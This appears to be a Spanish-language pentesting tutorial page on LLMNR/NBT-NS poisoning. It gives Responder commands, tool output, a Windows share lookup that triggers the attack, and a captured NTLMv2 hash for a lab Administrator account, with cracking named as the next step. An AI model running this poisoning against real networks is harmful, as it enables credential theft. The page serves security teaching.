---
icon: xmarks-lines
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# LLMNR - NBTNS Poisoning

Con esta tecnica lo que hacemos es envenenar la red para hacernos pasar por la resolucion del dominio al que se este intentando conectar un usuario para que nos proporcione dichos protocolos el `Challenge` tanto el normal como el cifrado.

Estos protocolos lo que hace el primero `LLMNR` es que cuando se esta intentando resolver un dominio utiliza de primeras este protocolo preguntando a todos los nodos de la red que IP esta asociada a ese dominio tanto por `IPv4` como por `IPv6` intentando hacer una resolucion `multicast`, pero cuando este falla por que no lo encuentra pasa la segundo protocolo el llamado `NBTNS` que hace resumidamente lo mismo pero esta vez pregunta a que IP le pertenece dicho dominio pero se lo pregunta al `Broadcast` y este se lo pregunta a todos los nodos de la red, cuando no hay solucion se le comunica al usuario que no existe.

Por lo que nosotros nos pondremos en mitad de la comunicacion en la red, para que cuando no exista un recurso compartido al que se quiere conectar un usuario, estemos ahi nosotros para decir que ese pertenece a nuestra IP y nos proporcione esos datos que mencione anteriormente.

Esto es muy comun ya que muchas veces los servidores se dejan tareas programadas a la hora de conectarse a un recurso compartido en nombre del `administrador` y cuando ese equipo o recuros compartido esta desconectado o apagado, este se intenta conectar de todas forma, por lo que ahi como atacante aprovechamos nosotros para extraer los datos.

En este caso vamos a utilizar una de las herramientas mas famosas cuando hablamos de envenenamiento de red con estos dos protocolos que es `responder`:

```shell
sudo responder -I eth0 -rf
```

Con el `-f` especificamos que nos muestre el `fingerPrint` del `host` Con el `-r` especificamos que realice una serie de respuestas cuando se utiliza el protocolo `NetBios`.

Pero en algunos casos no va, por lo que utilizaremos:

```shell
sudo responder -I eth0 -wd
```

Info:

```
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.5.205]
    Responder IPv6             [fe80::126b:3f32:5e50:9e6]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-KH82I01MBWY]
    Responder Domain Name      [0ZK0.LOCAL]
    Responder DCE-RPC Port     [45917]

[+] Listening for events...
```

Esto lo que hara sera crear varios servidores de todos esos protocolos para estar a la escucha y que cuando uno falle, el se haga pasar por dicho dominio, para proporcionarnos esa informacion.

Ahora vamos a irnos a `Windows` y fallar al intentar conectarnos a un recuro compartido mediante un dominio de la siguiente forma:

```powershell
dir \\test\c$
```

Ahora si nos volvemos a donde tenemos la escucha veremos lo siguiente:

```
[*] [MDNS] Poisoned answer sent to 192.168.5.5     for name test.local
[*] [MDNS] Poisoned answer sent to 192.168.5.5     for name test.local
[*] [MDNS] Poisoned answer sent to fe80::2129:cfa3:af2a:edd8 for name test.local
[*] [NBT-NS] Poisoned answer sent to 192.168.5.5 for name TEST (service: File Server)
[*] [LLMNR]  Poisoned answer sent to fe80::2129:cfa3:af2a:edd8 for name test
[*] [LLMNR]  Poisoned answer sent to 192.168.5.5 for name test
[*] [MDNS] Poisoned answer sent to fe80::2129:cfa3:af2a:edd8 for name test.local
[*] [LLMNR]  Poisoned answer sent to 192.168.5.5 for name test
[*] [LLMNR]  Poisoned answer sent to fe80::2129:cfa3:af2a:edd8 for name test
[SMB] NTLMv2-SSP Client   : fe80::2129:cfa3:af2a:edd8
[SMB] NTLMv2-SSP Username : CORP\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::CORP:7a0f9a56d14183c4:6D52ACDC0F3C7F5171C66454D1714AFA:010100000000000080999835E76CDB01FF4784D6170A6AC2000000000200080030005A004B00300001001E00570049004E002D004B004800380032004900300031004D0042005700590004003400570049004E002D004B004800380032004900300031004D004200570059002E0030005A004B0030002E004C004F00430041004C000300140030005A004B0030002E004C004F00430041004C000500140030005A004B0030002E004C004F00430041004C000700080080999835E76CDB0106000400020000000800300030000000000000000000000000300000ACE21C7FACA2562F2C447D78310E4A3EFDDC1C854E52BFC18DB9E0DEC3D525070A001000000000000000000000000000000000000900120063006900660073002F0074006500730074000000000000000000
```

Vemos que hemos obtenido el mismo `hash` que construimos nosotros anteriormente, que este se le llama el `hash NTLMv2` y ya seria cuestion de volver a intentar `crackearlo`, que veremos que nos lo conseguira `crackear` correctamente.
